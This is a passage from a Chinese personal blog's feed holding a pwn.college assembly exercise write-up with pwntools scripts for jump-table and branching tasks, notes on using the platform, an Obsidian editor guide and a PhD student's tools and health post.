class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 创建一个进程对象并运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># 接收并丢弃一行输出</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov eax,[rdi]</span><br><span class="hljs-string">    cmp eax, 0x7f454c46</span><br><span class="hljs-string">    je elf_format       </span><br><span class="hljs-string">    cmp eax, 0x00005A4D</span><br><span class="hljs-string">    je dos_format       </span><br><span class="hljs-string">    jmp other_format    </span><br><span class="hljs-string">elf_format:</span><br><span class="hljs-string">    mov eax, [rdi + 4]  </span><br><span class="hljs-string">    add eax, [rdi + 8]  </span><br><span class="hljs-string">    add eax, [rdi + 12] </span><br><span class="hljs-string">    jmp end             </span><br><span class="hljs-string"></span><br><span class="hljs-string">dos_format:</span><br><span class="hljs-string">    mov eax, [rdi + 4]  </span><br><span class="hljs-string">    sub eax, [rdi + 8]  </span><br><span class="hljs-string">    sub eax, [rdi + 12] </span><br><span class="hljs-string">    jmp end             </span><br><span class="hljs-string"></span><br><span class="hljs-string">other_format:</span><br><span class="hljs-string">    mov eax, [rdi + 4]  </span><br><span class="hljs-string">    imul eax, [rdi + 8] </span><br><span class="hljs-string">    imul eax, [rdi + 12]</span><br><span class="hljs-string">end:</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 发送汇编指令给进程</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># 打印进程的输出</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="26"><a href="#26" class="headerlink" title="26"></a>26</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">在这个级别中，你将使用控制流操作。这涉及使用指令直接或间接地控制特殊寄存器 <span class="hljs-string">`rip`</span>，即指令指针。你将使用 <span class="hljs-keyword">jmp</span>、<span class="hljs-keyword">call</span>、<span class="hljs-keyword">cmp</span> 等指令及其替代指令来实现所需的行为。<br><br>在这个级别中，我们将多次使用动态值测试你的代码！这意味着我们将以各种随机方式运行你的代码，以验证逻辑是否足够强大，能够在正常使用中生存。<br><br>最后一种跳转类型是间接跳转，通常在实际中用于 switch 语句。<br><br>switch 语句是 if 语句的一种特殊情况，它仅使用数字来确定控制流的走向。<br><br>以下是一个示例：<br>  switch(number):<br>    <span class="hljs-number">0</span>: <span class="hljs-keyword">jmp</span> do_thing_0<br>    <span class="hljs-number">1</span>: <span class="hljs-keyword">jmp</span> do_thing_1<br>    <span class="hljs-number">2</span>: <span class="hljs-keyword">jmp</span> do_thing_2<br><span class="hljs-symbol">    default:</span> <span class="hljs-keyword">jmp</span> do_default_thing<br><br>这个示例中的 switch 是基于 <span class="hljs-string">`number`</span> 进行操作，它可以是 <span class="hljs-number">0</span>、<span class="hljs-number">1</span> 或 <span class="hljs-number">2</span>。<br><br>如果 <span class="hljs-string">`number`</span> 不是这些数字之一，则会触发 <span class="hljs-meta">default</span>。<br><br>你可以将其视为简化的 else-if 结构。<br><br>在 x86 中，你已经习惯了使用数字，所以应该不会感到奇怪，你可以基于某个确切的数字来创建 if 语句。<br><br>此外，如果你知道数字的范围，switch 语句非常适用。<br><br>例如，考虑到跳转表的存在。<br><br>跳转表是一段连续的内存，其中保存着要跳转到的位置的地址。<br><br>在上面的示例中，跳转表可以是这样的：<br>  [<span class="hljs-number">0x1337</span>] = do_thing_0 的地址<br>  [<span class="hljs-number">0x1337</span>+<span class="hljs-number">0x8</span>] = do_thing_1 的地址<br>  [<span class="hljs-number">0x1337</span>+<span class="hljs-number">0x10</span>] = do_thing_2 的地址<br>  [<span class="hljs-number">0x1337</span>+<span class="hljs-number">0x18</span>] = do_default_thing 的地址<br><br>使用跳转表，我们可以大大减少使用 <span class="hljs-keyword">cmp</span> 指令的次数。<br><br>现在我们只需要检查 <span class="hljs-string">`number`</span> 是否大于 <span class="hljs-number">2</span>。<br><br>如果是，总是执行：<br>  <span class="hljs-keyword">jmp</span> [<span class="hljs-number">0x1337</span>+<span class="hljs-number">0x18</span>]<br>否则：<br>  <span class="hljs-keyword">jmp</span> [jump_table_address + number * <span class="hljs-number">8</span>]<br><br>利用上述知识，实现以下逻辑：<br>  如果 <span class="hljs-built_in">rdi</span> 是 <span class="hljs-number">0</span>：<br>    <span class="hljs-keyword">jmp</span> <span class="hljs-number">0x403006</span><br>  否则如果 <span class="hljs-built_in">rdi</span> 是 <span class="hljs-number">1</span>：<br>    <span class="hljs-keyword">jmp</span> <span class="hljs-number">0x4030ef</span><br>  否则如果 <span class="hljs-built_in">rdi</span> 是 <span class="hljs-number">2</span>：<br>    <span class="hljs-keyword">jmp</span> <span class="hljs-number">0x4031c8</span><br>  否则如果 <span class="hljs-built_in">rdi</span> 是 <span class="hljs-number">3</span>：<br>    <span class="hljs-keyword">jmp</span> <span class="hljs-number">0x4032ac</span><br>  否则：<br>    <span class="hljs-keyword">jmp</span> <span class="hljs-number">0x403367</span><br><br>请按照以下约束条件完成上述任务：<br>  假设 <span class="hljs-built_in">rdi</span> 不会为负数<br>  最多使用 <span class="hljs-number">1</span> 条 <span class="hljs-keyword">cmp</span> 指令<br>  最多使用 <span class="hljs-number">3</span> 条跳转指令（任意变体）<br>  我们会在 <span class="hljs-built_in">rdi</span> 中提供要进行 <span class="hljs-string">&#x27;switch&#x27;</span> 的数字<br>  我们会在 <span class="hljs-built_in">rsi</span> 中提供跳转表的基地址<br><br>这里是一个示例表格：<br>  [<span class="hljs-number">0x404222</span>] = <span class="hljs-number">0x403006</span>（地址将会改变）<br>  [<span class="hljs-number">0x40422a</span>] = <span class="hljs-number">0x4030ef</span><br>  [<span class="hljs-number">0x404232</span>] = <span class="hljs-number">0x4031c8</span><br>  [<span class="hljs-number">0x40423a</span>] = <span class="hljs-number">0x4032ac</span><br>  [<span class="hljs-number">0x404242</span>] = <span class="hljs-number">0x403367</span><br></code></pre></td></tr></table></figure><ul><li>跳转表的基地址在rsi中</li><li>偏移存在rdi中</li><li><code>[rsi + rdi*8]</code>就是要跳转的地址</li><li>最后一种情况：rsi偏移0x20（也就是4个8字节）的位置。注意不是绝对地址</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># 创建一个进程对象并运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><br><span class="hljs-comment"># 接收并丢弃一行输出</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    cmp rdi, 4        </span><br><span class="hljs-string">    jge default_case                               </span><br><span class="hljs-string">    lea rax, [rsi + rdi*8] </span><br><span class="hljs-string">    jmp [rax]    </span><br><span class="hljs-string">default_case:</span><br><span class="hljs-string">    mov rax,rsi</span><br><span class="hljs-string">    add rax,0x20</span><br><span class="hljs-string">    jmp [rax]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 发送汇编指令给进程</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># 打印进程的输出</span><br><span class="hljs-built_in">print</span>(p.readallS())<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn college 刷题记录：Getting Started</title>
    <link href="/p/f99ac2b6/"/>
    <url>/p/f99ac2b6/</url>
    
    <content type="html"><![CDATA[<p>讲述了如何使用胖烤了鸡这个平台</p><span id="more"></span><p><img src="/image/pwn-college.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>属于是熟悉环境的一节</li><li>胖烤了鸡特有的交互<ul><li>vscode</li><li>虚拟机</li></ul></li><li>剪切板如何使用</li><li>个人的家目录是固定的</li></ul><h1 id="using-vscode-work-space"><a href="#using-vscode-work-space" class="headerlink" title="using vscode work space"></a>using vscode work space</h1><p>描述了如何使用Visual Studio Code 工作区</p><ul><li>点击start，这样就会启动挑战</li><li>点击网站最上方的workspace，将会启动一个网页版vscode</li><li>网页版vsc可以使用ctrl+shift+c复制</li></ul><h1 id="using-the-desktop-gui"><a href="#using-the-desktop-gui" class="headerlink" title="using the desktop gui"></a>using the desktop gui</h1><ul><li>点击start</li><li>之后点击上方的desktop，启动远程虚拟机</li></ul><p>这地方比较sb的是从网页版虚拟机中复制东西。你在虚拟机复制之后，左侧会有一个剪贴板，再复制一次才能将内容复制到本机，这里它相当于一个中专作用</p><ol><li>Click on the ?? button on the left edge of the Desktop.</li><li>Click on the Clipboard button. The Dojo’s clipboard will appear!</li><li>Overwrite the contents of the dojo’s clipboard with the contents of your<br>system’s clipboard (for example, Ctrl-A followed by Ctrl-V).</li><li>Now the contents are in the dojo’s clipboard!</li><li>Paste the contents into the terminal (Right Click-&gt;Paste).</li></ol><h1 id="pasting-into-desktop"><a href="#pasting-into-desktop" class="headerlink" title="pasting into desktop"></a>pasting into desktop</h1><p>同上，教你怎么用剪贴板</p><h1 id="the-flag-file"><a href="#the-flag-file" class="headerlink" title="the flag file"></a>the flag file</h1><p>讲述了flag file：您正在以 <code>hacker</code> 用户身份执行，而 <code>/flag</code> 只能由 <code>root</code> 用户读取，因此您无法访问它。在之前的挑战中，挑战程序本身（例如 <code>/challenge/solve</code> ）以 <code>root</code> 用户身份运行（因此可以读取标志），读取此文件并打印其内容内容</p><h1 id="using-practice-mode"><a href="#using-practice-mode" class="headerlink" title="using practice mode"></a>using practice mode</h1><p> <code>Practice</code> 模式。这将授予您挑战容器中的管理权限（通过 <code>sudo</code> ），使您能够更强大地调试解决方案并以其他方式尝试挑战。您无法使用它来实际解决挑战，因为在练习模式下， <code>/flag</code> 文件会被替换为无法兑换积分的练习标志。</p><p>先进去practice，得到secret。然后进去start，把secret发给终端得到flag</p><h1 id="persistent-home-directories-one"><a href="#persistent-home-directories-one" class="headerlink" title="persistent home directories - one"></a>persistent home directories - one</h1><p>您在道场中的主目录在挑战之间保持不变。这意味着当您开始新的挑战时，您保存在其中的所有文件仍然会在那里。您可以使用它在模块中的多个挑战中建立笔记，参考旧的解决方案，或者针对非练习模式中的挑战重新运行在练习模式中完善的解决方案。</p><p>这个挑战和下一个挑战将通过让您在主目录中写入一个文件来阐明要点。发起此挑战并按照其说明进行操作！</p><h1 id="persistent-home-directories-two"><a href="#persistent-home-directories-two" class="headerlink" title="persistent home directories - two"></a>persistent home directories - two</h1><p>现在您已经在主目录中创建了一个文件，本次挑战将使用它！发起此挑战并按照其说明进行操作！</p><p>Congratulations! The file that you created in the last challenge is still<br>present in your home directory! Please keep in mind that, though the contents<br>of /home/hacker persist, other areas (such as /tmp, /challenge, and so on) do<br>not.</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>obsidian：地表最强markdown编辑器</title>
    <link href="/p/26528d5e/"/>
    <url>/p/26528d5e/</url>
    
    <content type="html"><![CDATA[<p><img src="https://img.gls.show/img/20230913200440.png"></p><p>obsidian，也称黑曜石，是最近风头无两的编辑器，它有着强大的开源插件拓展，以及反向索引功能，以开源、免费、本地存储、易上手的特点，对其余markdown编辑器进行了降维打击（比如某收费编辑器）</p><h1 id="初始配置"><a href="#初始配置" class="headerlink" title="初始配置"></a>初始配置</h1><p>略过下载、安装步骤</p><p>打开ob，你会发现如下界面</p><p><img src="https://img.gls.show/img/20230912150124.png"></p><p>如果用惯了别的编辑器，或许对ob【仓库（vault）】的概念感觉陌生。原来，ob将固定的文件夹视为一个仓库，你也可以将它视作一个工作目录，每一个仓库都是独立的，假设你在这个仓库中安装了一些插件，那么对应的配置就会写在该文件夹下的.ob文件夹中</p><p>如果没有任何仓库，直接点击创建即可。如果以及有了本地仓库，直接选择并打开即可</p><h1 id="外观更改"><a href="#外观更改" class="headerlink" title="外观更改"></a>外观更改</h1><p>ob默认的颜色是黑色，如果不喜欢这个颜色，可以在<code>设置-》外观-》基础颜色</code>中设置为白色</p><p>或者，可以点击<code>设置-》外观-》主题-》管理</code>，下载主题并应用</p><p>此外，使用插件（比如style setting）可以个性化配置以上所下载的ob的主题，比如调整字体大小、颜色甚至直接导入css文件等</p><p><img src="https://img.gls.show/img/20230810160851.png"></p><p><strong>几个推荐的主题：</strong></p><ul><li>shimmering</li><li>ITS</li><li>minimal</li><li>Blue Topaz(蓝色托帕石）</li></ul><h1 id="字体更改"><a href="#字体更改" class="headerlink" title="字体更改"></a>字体更改</h1><p>ob支持更换软件界面和正文中的字体，方式很简单</p><ul><li>先下载字体</li><li>设置-》字体更改-》输入字体名称-》保存</li></ul><p><a href="https://coffeetea.top/zh/best-practices/obsidian-font-LXGW.html">obsidian更换字体 | obsidian文档咖啡豆版</a></p><h1 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h1><p>ob最吸引人的或许就是它的插件功能。点击左下角的齿轮，进入设置界面，点击左侧【第三方插件】，关闭【安全模式】，即可进入插件市场安装插件。安装之后，还需要点击【激活】方可使用插件</p><p>以outline插件为例，它的使用、激活步骤如下：</p><p>You can activate this plugin within Obsidian by doing the following:</p><ul><li>Open Settings &gt; Third-party plugin</li><li>Make sure Safe mode is off</li><li>Click Browse community plugins</li><li>Search for “Outliner”</li><li>Click Install</li><li>Once installed, close the community plugins window and activate the newly installed plugin</li></ul><p>下面是一些推荐的插件：</p><ul><li>link title <ul><li>粘贴链接的时候会自动生成该连接的摘要并生成超链接</li></ul></li><li>advance tables<ul><li>提升ob的表格编辑体验</li></ul></li><li>advanced slides<ul><li>使用md制作slides</li></ul></li><li>style setting<ul><li>支持对主题进行调整</li></ul></li><li>calendar<ul><li>方便创建每日记录，并提供日历看板</li></ul></li><li>image toolkit<ul><li>提升ob的看图体验</li></ul></li></ul><h1 id="使用技巧"><a href="#使用技巧" class="headerlink" title="使用技巧"></a>使用技巧</h1><h2 id="链接设置"><a href="#链接设置" class="headerlink" title="链接设置"></a>链接设置</h2><p>obsidian默认的图片链接格式如下所示：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">!<span class="hljs-string">[[Pasted image 20231106215146.png]]</span><br></code></pre></td></tr></table></figure><p>但是，markdown的图片链接一般是这种格式：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less">!<span class="hljs-selector-attr">[]</span>(url)<br></code></pre></td></tr></table></figure><p>那么如果你使用别的md编辑器(比如typora)打开的话，这些图片就无法正常显示</p><p>此外，ob默认是支持双链的 ，如果不喜欢需要在设置中关掉</p><p>选项</p><h1 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h1><p>设置-》选项-》快捷键可以手动设置快捷键，我常用的快捷键：</p><ul><li>将设置无序列表映射到快捷键<code>c+l</code></li><li>有序列表映射到快捷键<code>alt+l</code></li><li><code>c+-</code> 将界面字体变小</li><li><code>c++</code> 将界面字体变大</li><li><code>c+a+l</code> 可以创建待办事项</li><li><code>c+s+l</code>锁定当前笔记</li></ul><h1 id="多平台同步"><a href="#多平台同步" class="headerlink" title="多平台同步"></a>多平台同步</h1><p>可以使用坚果云开webdav来同步，这样可以实现多平台的无缝衔接，这也是我目前的使用方案</p><p>此外，如果有存储桶的话（比如腾讯阿里的oss，或者aws的s3这种），可以考虑使用remotely save这个插件进行同步，相关阅读：<br><a href="https://blog.csdn.net/cansaizheng/article/details/125190336">Obsidian利用插件Remotely-save实现超低成本全平台云笔记_remotely save_Positive One的博客-CSDN博客</a></p><h1 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h1><ul><li><a href="https://forum-zh.obsidian.md/t/topic/8728">2022年7月，obsidian 依然必装的 10 个插件 - 经验分享 - Obsidian 中文论坛</a></li></ul><ul><li><a href="https://www.jianshu.com/p/3272cd6f0bf8">70 多个 Obsidian 主题 - 简书</a></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PhD之路</title>
    <link href="/p/5bb7293b/"/>
    <url>/p/5bb7293b/</url>
    
    <content type="html"><![CDATA[<blockquote><p> 在此处亟需一个宏大的沉思</p></blockquote><p><img src="https://img.gls.show/img/20230906152007.png"></p><h1 id="我的科研工具"><a href="#我的科研工具" class="headerlink" title="我的科研工具"></a>我的科研工具</h1><ul><li>设备<ul><li>X86台式工作站（工作用，搭载i9-10980XE处理器）<ul><li>生产力工具</li><li>工作主力</li></ul></li><li>MacBook Pro（出门用，M1 Pro 芯片）<ul><li>用作移动办公</li><li>续航无敌，可以坚持10小时以上</li></ul></li><li>ThinkPad P14s<ul><li>皮实耐用</li><li>有触摸屏，可180度开合</li><li>移动的瑞士军刀</li></ul></li><li>乐歌电动升降桌</li><li>京造Z7人体工学椅</li></ul></li><li>文献管理<ul><li>我使用zotero管理我的文献</li><li>zotero自带了同步功能（容量不大），如果不想付费且需要大量同步文献可以考虑第三方软件，比如坚果云、icloud等</li></ul></li><li>报告撰写<ul><li>不需要多人合作时，我使用latex</li><li>多人合作时，我使用overleaf</li></ul></li><li>知识记录<ul><li>我过去曾经尝试过使用vscode+插件、texstudio、typora、Rmarkdown等方式进行文字书写工作</li><li>我现在使用obsidian对我看过的书籍、阅读过的论文进行记录。对于那些值得分享的东西，我会将它们作为博客发表在我的网站（<a href="http://www.gls.show)上./">www.gls.show）上。</a><ul><li>obsidian具有丰富的插件支持，可以完成各种功能</li><li>notion是对于非程序员的最好选择，它支持多平台同步，易于上手。可惜数据放在云上，而我认为这样不安全</li></ul></li></ul></li><li>邮箱<ul><li>我使用foxmail进行多个邮箱的集成管理</li><li>在这之前我曾使用过自由软件thunder bird，但是它在我的机器上会闪退。我还使用过Outlook、mailspring等邮箱客户端，但是都会有一些瑕疵</li></ul></li><li>组会slides<ul><li>关于制作组会slides的方式，我的使用路线（时间顺序）如下：微软PowerPoint-》md+pandoc-》reveal.js-》latex beamer-》谷歌doc</li><li><del>从喜欢折腾到大道至简，但是最近又觉得slidev很好玩</del></li></ul></li><li>编码<ul><li>对于小型的编码工作，我使用terminal+vim、tumx、git</li><li>对于中大型的编码工作，我使用vscode或者jetbrain的ide（学生可以使用邮箱免费获取正版licence）</li><li>我在腾讯云上购买了一台服务器和对象存储服务，用来跑一些服务。这个网站就架设在上面</li></ul></li><li>科研绘图<ul><li>PowerPoint、Python matplot、Rstudio</li></ul></li><li>翻译<ul><li>浏览器上我使用沙拉查词、沉浸式翻译</li><li>全局下我使用网易的划词功能</li></ul></li></ul><h1 id="我以为的科研必备网站"><a href="#我以为的科研必备网站" class="headerlink" title="我以为的科研必备网站"></a>我以为的科研必备网站</h1><p>文献搜索</p><ul><li><a href="https://dblp.org/">dblp: computer science bibliography</a></li><li><a href="https://scholar.google.com.hk/?hl=zh-CN">Google 学术搜索</a><ul><li>或许可以尝试一下高级搜索</li><li><a href="https://scholar.google.com/citations?view_op=top_venues&hl=en&vq=eng_computersecuritycryptography">Computer Security &amp; Cryptography - Google Scholar Metrics</a></li><li><a href="https://scholar.google.com/citations?view_op=top_venues&hl=en&vq=eng_softwaresystems">Software Systems - Google Scholar Metrics</a></li><li><a href="https://scholar.google.com/citations?view_op=top_venues&hl=en&vq=eng_computingsystems">Computing Systems - Google Scholar Metrics</a></li></ul></li><li><a href="https://www.connectedpapers.com/">Connected Papers | Find and explore academic papers</a></li><li><a href="https://arxiv.org/">arXiv.org e-Print archive</a></li></ul><p>文献下载</p><ul><li><a href="https://sci-hub.se/">Sci-Hub: 将知识带给每个人</a></li><li><a href="https://z-lib.is/">Z-Library Project - Electronic library. Download books free</a></li></ul><h2 id="科研之外的常逛网站？"><a href="#科研之外的常逛网站？" class="headerlink" title="科研之外的常逛网站？"></a>科研之外的常逛网站？</h2><ul><li><p>我在这里获取一些快乐：</p><ul><li><a href="https://phdcomics.com/">PHD Comics: New Book! Oliver’s Great Big Universe!</a></li></ul></li><li><p>我在这里获取一些资讯：</p><ul><li><a href="https://www.quora.com/">Quora - A place to share knowledge and better understand the world</a></li><li><a href="https://thesiswhisperer.com/">The Thesis Whisperer</a></li><li><a href="https://news.ycombinator.com/">Hacker News</a></li><li><a href="https://www.v2ex.com/">V2EX</a></li><li><a href="https://github.com/">GitHub: Let’s build from here · GitHub</a></li><li><a href="https://tophub.today/c/news">今日热榜</a></li><li><a href="https://rebang.today/">今日热榜</a></li></ul></li></ul><h1 id="做研究的方法论"><a href="#做研究的方法论" class="headerlink" title="做研究的方法论"></a>做研究的方法论</h1><ul><li><a href="https://www.eecs.harvard.edu/htk/phdadvice/">Useful Thoughts about Research</a></li><li><a href="https://zhuanlan.zhihu.com/p/512528671?utm_source=wechat_session&utm_medium=social&utm_oi=1466693950451363841&utm_content=group2_article&utm_campaign=shareopn&s_r=0">顶会论文的经验分享与心路历程</a></li><li>web.stanford.edu/class/ee384m/Handouts/HowtoReadPaper.pdf</li></ul><h1 id="daily-routine"><a href="#daily-routine" class="headerlink" title="daily routine"></a>daily routine</h1><p>早饭一般吃麦当劳</p><ul><li>如果前一晚睡眠不错的话我会点豆浆</li><li>如果睡眠不好的话我会换成咖啡</li></ul><p>一般我在早上九点钟开始工作，力求高效</p><p>科研时我会听一些古典音乐，<a href="https://gls.show/about/">这里</a>有一份我科研时的音乐清单</p><p>在我做选择的时候，我经常听命运交响曲，贝多芬是我在音乐上的偶像</p><p>我使用obsidian的一些拓展进行我每日的记录，我认为记录每日的工作和生活是一个良好的习惯</p><ul><li>calendar。可以在ob中显示日历，并且快速创建当天的笔记</li><li><del>dayplanner</del>。虽然感觉甘特图很酷，但是维护它有点太复杂了</li></ul><p>我自大学开始对茶学有很浓厚的兴趣，并保持至今，我每天都会喝茶，偶尔会用咖啡代替</p><h1 id="我为什么选择直博"><a href="#我为什么选择直博" class="headerlink" title="我为什么选择直博"></a>我为什么选择直博</h1><h1 id="科研之外我在做什么"><a href="#科研之外我在做什么" class="headerlink" title="科研之外我在做什么"></a>科研之外我在做什么</h1><h1 id="写给同龄博士生的一份健康指南"><a href="#写给同龄博士生的一份健康指南" class="headerlink" title="写给同龄博士生的一份健康指南"></a>写给同龄博士生的一份健康指南</h1><h1 id="饮水"><a href="#饮水" class="headerlink" title="饮水"></a>饮水</h1><p>一个广为流传的说法是这样的，我们每天应该喝至少8杯水，除了任何其他的饮料之外，每天还要喝8杯240毫升的水，总量接近两升</p><p>这个说法有很多出处，比如：</p><ul><li>1945年，美国国家研究委员会（National Research Council）的食品与营养委员会（Food and Nutrition Board）建议，成年人每食用一卡路里食物，就要摄入一毫升液体。女性如果摄入2000卡路里的食物就要喝两升液体，而摄入2500卡路里的男性则需要饮用2.5升液体。</li><li>英国国民保健系统（NHS）建议，对于那些不按官方指引喝水也不会觉得口渴的人，每天喝6到8杯液体即可，包括低脂牛奶、无糖饮料、茶和咖啡</li></ul><p>两个喝水的准则：</p><ul><li>不要等到口渴才主动喝水</li><li>八杯水并非金规玉律，要因人而异</li></ul><h1 id="饮茶"><a href="#饮茶" class="headerlink" title="饮茶"></a>饮茶</h1><p>饮茶对人体大有裨益，这一点可以被知网大量的论文佐证。毫无疑问，茶叶是比酒精、咖啡更健康的饮料</p><p>不同的茶有不同的特点，有这样一个说法：“夏喝绿，冬喝红，一年四季喝乌龙”，茶叶有<strong>相性</strong>，在适合的季节喝适合的茶，才能使对身体的好处最大化</p><ul><li>春节：花茶。花茶的芳香之气可以令人精神振奋，心情舒畅</li><li>夏季：绿茶。夏季炎热高温，容易中暑和困乏，绿茶富含茶多酚、氨基酸、咖啡碱、维生素等营养元素，喝绿茶一方面有益于微量元素的摄入，一方面有益于消热解暑、提神醒脑</li><li>秋季：乌龙茶。秋季气候由热转凉，天气干燥，乌龙茶茶性温和，介于红茶与绿茶之间，可使人口齿生津，润肠消积</li><li>冬季：红茶。冬季寒气重气候冷，红茶性暖，饮用红茶可以御寒</li></ul><h1 id="腰椎保护"><a href="#腰椎保护" class="headerlink" title="腰椎保护"></a>腰椎保护</h1><p>TBD</p><p>参考：《麦肯基疗法》</p><h1 id="视力保护"><a href="#视力保护" class="headerlink" title="视力保护"></a>视力保护</h1><blockquote><p>如今流的泪的都是当初年少无知脑子进的水，在现在有了保护视力的觉悟的时候，已经高度近视了，而且有着弱视的趋势（高度近视很难矫正到正常视力）。在这里记录一些保护视力的方法：</p></blockquote><ul><li>每天与自然光接触至少两个小时，有科学研究表明不接触阳光容易影响视力</li><li>使用热毛巾敷眼睛，或者午睡时使用蒸汽眼罩</li><li>闭上眼睛缓慢转动眼球</li><li>长时间用眼之后，向远处眺望</li><li>在光线充足的情况下使用电子产品，晚上不要在没有光线的情况下玩手机，这样很容易造成散光加重</li><li>可以考虑使用屏幕挂灯，减少显示器对眼睛的影响</li><li>定期去医院检查眼睛，以防止眼睛的病变</li><li>多打乒乓球</li></ul><blockquote><p>8-16去了一趟宝岛眼镜，做了验光和眼底检查，花了一百多元，然后花了一千多元配镜，体验很好，同时也感受到了这世界上最贵的就是身体，一副普通的眼镜随随便便就可以花掉你几千块钱</p></blockquote><h1 id="文献阅读方法论"><a href="#文献阅读方法论" class="headerlink" title="文献阅读方法论"></a>文献阅读方法论</h1><p>TBD</p><h1 id="健身"><a href="#健身" class="headerlink" title="健身"></a>健身</h1><ul><li>坚持自由重量器械。哑铃和杠铃依旧是最好的选择，特别是对于以增肌为目的的初学者。</li><li>坚持复合运动。坚持那些基本动作，如深蹲、硬拉、杠铃卧推，并将其作为长期计划中的动作内容。</li><li>建立规划。需要有一个严格的健身计划，并按照计划执行。包括你需要做的练习动作，以及练习的组数和每组的数量。踏进健身房的一刻，你需要确切地知道接下来要练习的动作。</li><li>训练频率。每周安排3次或4次的训练，训练日外的时间是用来休息和恢复的，休息和训练一样重要。</li><li>一周内每个肌群都需要练习。</li><li>规范动作。做错误的动作还不如不做。</li><li>逐渐增加重量。如果你已经掌握了每个动作的正确方法，就可以开始周期性地增加重量。</li><li>多餐。每天4-5餐，间隔3-4小时。准备一些健康的零食。</li><li>避免垃圾食品。摄取健康的食物，如瘦肉蛋白质、复合碳水化合物、和健康的脂肪，远离垃圾食品、大量甜食和油腻的食物。</li><li>多摄入水果和蔬菜。除了蛋白质、碳水化合物和脂肪，你的身体也需要微量营养素（维生素和矿物质）。因此，请确保每一天摄入足量的水果和蔬菜。</li><li>休息和恢复。每天晚上都要保证充足的睡眠（约8-9小时）。</li></ul><h1 id="睡眠革命"><a href="#睡眠革命" class="headerlink" title="睡眠革命"></a>睡眠革命</h1><ul><li></li></ul><h1 id="疾病预防"><a href="#疾病预防" class="headerlink" title="疾病预防"></a>疾病预防</h1>]]></content>
    
    
    <categories>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>攻略，规划</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn college 刷题记录：fundamental-program misuse</title>
    <link href="/p/7b0851b2/"/>
